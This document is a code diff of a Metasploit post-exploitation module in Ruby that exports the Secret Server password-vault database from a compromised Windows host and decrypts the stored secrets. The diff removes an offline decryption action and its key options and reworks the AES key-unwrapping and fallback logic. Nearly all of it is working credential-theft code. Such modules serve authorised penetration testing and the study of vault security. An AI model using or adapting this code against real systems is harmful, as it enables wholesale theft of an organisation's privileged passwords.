@@ -46,15 +46,9 @@ class MetasploitModule < Msf::Post
           [
             'Export',
             {
-              'Description' => 'Export Secret Server database'
+              'Description' => 'Export Secret Server database without decryption'
             }
-          ],
-          [
-            'Decrypt',
-            {
-              'Description' => 'Decrypt Secret Server Database export'
-            }
-          ],
+          ]
         ],
         'DefaultAction' => 'Dump',
         'Notes' => {
@@ -65,45 +59,6 @@ class MetasploitModule < Msf::Post
         'Privileged' => true
       )
     )
-    register_options([
-      OptPath.new('CSVFILE', [ false, 'Path to database dump CSV file' ]),
-      OptInt.new('SESSION', [ false, 'The session to run this module on' ])
-    ])
-    register_advanced_options([
-      OptFloat.new('BUILD', [ false, 'Secret Server version / build number (ex: 10.2)' ]),
-      OptString.new('KEY', [ false, 'SecretServer 128-bit AES MEK value (hex)' ]),
-      OptString.new('KEY256', [ false, 'SecretServer 256-bit AES MEK value (hex)' ]),
-      OptString.new('IV', [ false, 'SecretServer MEK IV (hex)' ]),
-      OptString.new('IP', [ false, 'Optional IPv4 address to attach to loot if sessionless', '127.0.0.1' ])
-    ])
-  end
-
-  def current_session
-    datastore['SESSION']
-  end
-
-  def csv_loot
-    datastore['CSVFILE']
-  end
-
-  def ss_key
-    @ss_key ||= datastore['KEY']
-  end
-
-  def ss_key256
-    @ss_key256 ||= datastore['KEY256']
-  end
-
-  def ss_iv
-    @ss_iv ||= datastore['IV']
-  end
-
-  def ss_build
-    @ss_build ||= datastore['BUILD']
-  end
-
-  def loot_host
-    datastore['IP']
   end
 
   def export_header_row_legacy
@@ -119,58 +74,19 @@ class MetasploitModule < Msf::Post
   end
 
   def run
+    init_module
     current_action = action.name.downcase
-    if current_action == 'decrypt' && !csv_loot
-      print_error('No database export file specified')
-      raise Msf::OptionValidateError, ['CSVFILE']
-    end
-    if current_session < 0
-      raise Msf::OptionValidateError, ['KEY'] if ss_key.nil?
-
-      unless ss_key.length == 32 && ss_key.match?(/^[0-9a-f]+$/i)
-        print_error('Key value must be 16 byte / 32 char hexadecimal')
-        raise Msf::OptionValidateError, ['KEY']
-      end
-      raise Msf::OptionValidateError, ['KEY256'] if ss_key256.nil?
-
-      unless ss_key256.length == 64 && ss_key256.match?(/^[0-9a-f]+$/i)
-        print_error('Key256 value must be 32 byte / 64 char hexadecimal')
-        raise Msf::OptionValidateError, ['KEY256']
-      end
-      raise Msf::OptionValidateError, ['IV'] if ss_iv.nil?
-
-      unless ss_iv.length == 32 && ss_iv.match?(/^[0-9a-f]+$/i)
-        print_error('IV value must be 16 byte / 32 char hexadecimal')
-        raise Msf::OptionValidateError, ['IV']
-      end
-      @ss_key = [ss_key].pack('H*')
-      @ss_key256 = [ss_key256].pack('H*')
-      @ss_iv = [ss_iv].pack('H*')
-      if ss_build.nil? || ss_build <= 0
-        print_error('Please specify the target build of Secret Server for offline decryption')
-        raise Msf::OptionValidateError, ['BUILD']
-      end
-      @ss_build = ss_build.to_f
-    else
-      init_module
-    end
     case current_action
     when 'dump'
-      fail_with(Msf::Exploit::Failure::NoTarget, 'Dump is not a supported action without a valid session') unless current_session > 0
       print_status('Performing export and decryption of Secret Server SQL database')
       encrypted_csv_file = export
       print_good("Encrypted Secret Server Database Dump: #{encrypted_csv_file}")
       decrypted_csv_file = decrypt(encrypted_csv_file)
       print_good("Decrypted Secret Server Database Dump: #{decrypted_csv_file}")
     when 'export'
-      fail_with(Msf::Exploit::Failure::NoTarget, 'Export is not a supported action without a valid session') unless current_session > 0
       print_status('Performing export of Secret Server SQL database to CSV file')
       encrypted_csv_file = export
       print_good("Encrypted Secret Server Database Dump: #{encrypted_csv_file}")
-    when 'decrypt'
-      print_status('Performing decryption of Secret Server SQL database export')
-      decrypted_csv_file = decrypt(csv_loot)
-      print_good("Decrypted Secret Server Database Dump: #{decrypted_csv_file}")
     end
   end
 
@@ -183,9 +99,8 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt(csv_file)
-    csv = read_csv_file(csv_file)
+    fail_with(Msf::Exploit::Failure::NoTarget, 'No records imported from CSV dataset') unless (csv = read_csv_file(csv_file))
     total_rows = csv.count
-    fail_with(Msf::Exploit::Failure::NoTarget, 'No rows in import file CSV dataset') unless total_rows > 1
     print_good("#{total_rows} rows loaded, #{@ss_total_secrets} unique SecretIDs")
     result = decrypt_thycotic_db(csv)
     ss_processed_rows = result[:processed_rows]
@@ -270,7 +185,6 @@ class MetasploitModule < Msf::Post
       secret_name = [row['SecretName'][2..]].pack('H*')
       secret_type = [row['SecretType'][2..]].pack('H*')
       secret_encrypted = row['IsEncrypted'].to_i
-      secret_salted = row['IsSalted'].to_i
       secret_use256 = row['Use256Key'].to_i
       secret_iv_hex = row['IV'][2..]
       if @ss_build >= 10.4 || secret_iv_hex == 'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF' # New-style: ItemKey and ItemIV are part of the key blob
@@ -295,7 +209,7 @@ class MetasploitModule < Msf::Post
       iv = [iv_hex].pack('H*')
       miv = [miv_hex].pack('H*')
       if secret_encrypted == 1
-        secret_plaintext_1 = thycotic_secret_decrypt(secret_id: secret_id, secret_field: secret_field, secret_value: value_1, secret_key: key, secret_iv: iv, secret_miv: miv, secret_use256: secret_use256, secret_salted: secret_salted)
+        secret_plaintext_1 = thycotic_secret_decrypt(secret_id: secret_id, secret_field: secret_field, secret_value: value_1, secret_key: key, secret_iv: iv, secret_miv: miv, secret_use256: secret_use256)
         if secret_plaintext_1.nil?
           vprint_warning("SecretID #{secret_id} field '#{secret_field}' decrypted ItemValue nil, excluding")
           blank_rows += 1
@@ -397,7 +311,7 @@ class MetasploitModule < Msf::Post
     ss_build_major = csv['Major'].first.to_i
     ss_build_minor = csv['Minor'].first.to_i
     ss_build_rev = csv['Rev'].first.to_i
-    @ss_build = "#{ss_build_major}.#{ss_build_minor}.#{ss_build_rev}".to_f
+    @ss_build = "#{ss_build_major}.#{ss_build_minor}#{ss_build_rev}".to_f
     fail_with(Msf::Exploit::Failure::Unknown, 'Error determining Secret Server version from SQL query') unless @ss_build > 0
     print_status("Secret Server Build #{@ss_build}")
     print_warning('This module has not been tested against Secret Server versions below 8.4 and may not work') if @ss_build < 8.4
@@ -567,7 +481,7 @@ class MetasploitModule < Msf::Post
     if @ss_db_integrated_auth
       print_good("\tDatabase User: (Windows Integrated)")
       print_warning('The database uses Windows authentication')
-      print_warning('Your Meterpreter username / session identity must have access to the SQL server instance to proceed')
+      print_warning('Session identity must have access to the SQL server instance to proceed')
     end
   end
 
@@ -606,28 +520,22 @@ class MetasploitModule < Msf::Post
     secret_iv = options.fetch(:secret_iv)
     secret_miv = options.fetch(:secret_miv)
     secret_use256 = options.fetch(:secret_use256)
-    secret_salted = options.fetch(:secret_salted)
     if secret_use256 == 1
-      mek = ss_key256
+      mek = @ss_key256
     else
-      mek = ss_key
+      mek = @ss_key
     end
-    if @ss_build > 8.7 && secret_salted == 1
+    intermediate_key = false
+    if @ss_build > 8.7
       intermediate_key = aes_cbc_decrypt(secret_key, mek, secret_miv)
-    elsif @ss_build > 8.7
-      intermediate_key = secret_key
+      intermediate_key ||= secret_key
     else
       intermediate_key = mek
     end
-    if intermediate_key
-      decrypted_secret = aes_cbc_decrypt(secret_value, intermediate_key, secret_iv)
-    else
-      vprint_warning("SecretID #{secret_id} field '#{secret_field}' decryption failed, attempting ItemKey decryption")
-      decrypted_secret = aes_cbc_decrypt(secret_value, secret_key, secret_iv)
-    end
+    decrypted_secret = aes_cbc_decrypt(secret_value, intermediate_key, secret_iv)
     unless decrypted_secret
-      vprint_warning("SecretID #{secret_id} field '#{secret_field}' decryption failed, attempting MEK decryption")
-      decrypted_secret = aes_cbc_decrypt(secret_value, mek, secret_iv)
+      vprint_warning("SecretID #{secret_id} field '#{secret_field}' decryption failed, attempting pure MEK decryption as last resort")
+      decrypted_secret = aes_cbc_decrypt(secret_value, mek, @ss_iv)
     end
     return false unless decrypted_secret
 
